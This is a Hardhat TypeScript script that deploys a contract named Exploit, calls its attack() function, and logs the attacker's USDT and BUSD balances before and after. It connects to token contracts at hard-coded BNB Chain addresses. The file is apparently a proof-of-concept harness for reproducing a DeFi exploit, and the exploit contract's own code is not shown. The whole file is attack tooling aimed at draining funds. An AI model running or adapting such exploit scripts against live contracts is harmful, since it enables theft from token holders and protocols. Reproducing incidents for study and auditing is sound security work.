import hre from "hardhat"
import {Exploit__factory, IERC20__factory} from "../typechain";

async function main() {
  const [signer] = await hre.ethers.getSigners();
  const usdt = IERC20__factory.connect("0x55d398326f99059fF775485246999027B3197955",signer);
  const busd = IERC20__factory.connect("0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56",signer);
  const exploit = await new Exploit__factory(signer).deploy();
  console.log("Exploit contract deployed to: ",exploit.address)

  console.log("USDT balance of attacker:",hre.ethers.utils.formatUnits(await usdt.balanceOf(signer.address),await usdt.decimals()))
  console.log("BUSD balance of attacker:",hre.ethers.utils.formatUnits(await busd.balanceOf(signer.address),await busd.decimals()))
  console.log("Exploiting...")
  await exploit.attack();
  console.log("Exploit complete.")
  console.log("USDT balance of attacker:",hre.ethers.utils.formatUnits(await usdt.balanceOf(signer.address),await usdt.decimals()))
  console.log("BUSD balance of attacker:",hre.ethers.utils.formatUnits(await busd.balanceOf(signer.address),await busd.decimals()))
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
